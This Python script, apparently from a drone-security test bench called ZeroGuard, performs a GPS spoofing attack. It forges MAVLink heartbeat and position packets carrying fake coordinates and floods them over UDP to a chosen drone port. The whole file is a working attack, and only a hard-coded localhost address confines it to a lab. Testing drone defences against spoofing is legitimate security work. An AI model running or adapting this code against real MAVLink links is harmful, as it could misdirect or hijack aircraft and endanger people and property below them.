"""
ZeroGuard Attack Script — GPS Spoofing
Injects fake GPS packets into a target drone's MAVLink stream.
Usage: python3 attack_gps_spoof.py [drone_id]
  drone_id: 1 (port 14550), 2 (port 14560), 3 (port 14570)
"""
import sys, time, socket
from pymavlink import mavutil

DRONE_PORTS = {1: 14550, 2: 14560, 3: 14570}
TARGET_IP   = "127.0.0.1"

# Spoofed location — Kazakhstan (far from Nevada test site)
FAKE_LAT =  473566100   # 47.3566 N  (×1e7)
FAKE_LON =  854619300   # 85.4619 E  (×1e7)
FAKE_ALT =  150000      # 150 m (mm)

def make_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def send_udp(data, ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(data, (ip, port))
    s.close()

def run(drone_id=1):
    port = DRONE_PORTS.get(drone_id)
    if not port:
        print(f"[!] Invalid drone_id {drone_id}. Use 1, 2, or 3.")
        sys.exit(1)

    print(f"[!] GPS SPOOFING ATTACK — Drone {drone_id} (port {port})")
    print(f"[!] Injecting fake coords: {FAKE_LAT/1e7:.4f}N, {FAKE_LON/1e7:.4f}E")
    print(f"[!] Target: {TARGET_IP}:{port}")
    print(f"[!] Ctrl+C to stop\n")

    count = 0
    while True:
        mav = make_mav()
        boot_ms = int(time.time() * 1000) & 0xFFFFFFFF
        t_us    = int(time.time() * 1e6)

        hb = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        ).pack(mav)

        gps = mav.gps_raw_int_encode(
            time_usec=t_us, fix_type=3,
            lat=FAKE_LAT, lon=FAKE_LON, alt=FAKE_ALT,
            eph=100, epv=100, vel=500, cog=0,
            satellites_visible=10
        ).pack(mav)

        pos = mav.global_position_int_encode(
            time_boot_ms=boot_ms,
            lat=FAKE_LAT, lon=FAKE_LON,
            alt=FAKE_ALT, relative_alt=FAKE_ALT,
            vx=0, vy=0, vz=0, hdg=0
        ).pack(mav)

        send_udp(hb,  TARGET_IP, port)
        send_udp(gps, TARGET_IP, port)
        send_udp(pos, TARGET_IP, port)

        count += 1
        print(f"\r[+] Injected {count} spoofed GPS bursts → Drone {drone_id}", end="", flush=True)
        time.sleep(0.3)

if __name__ == "__main__":
    did = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    try:
        run(did)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")